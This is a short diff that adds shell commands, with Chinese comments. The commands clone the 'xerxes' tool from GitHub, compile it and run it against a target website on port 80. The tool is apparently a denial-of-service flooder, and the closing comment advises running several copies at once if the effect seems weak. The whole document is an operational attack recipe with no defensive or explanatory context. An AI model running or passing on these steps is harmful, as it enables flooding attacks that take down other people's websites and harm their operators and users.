@@ -1,0 +1,10 @@
+cd /tmp
+git clone https://github.com/zanyarjamal/xerxes.git
+ 
+cd xerxes
+ 
+gcc xerxes.c -o xerxes
+ 
+./xerxes 目标网站，www开头 端口，一般是80
+ 
+#如果感觉效果不是很明显，可以多开几个窗口跑一样的内容。
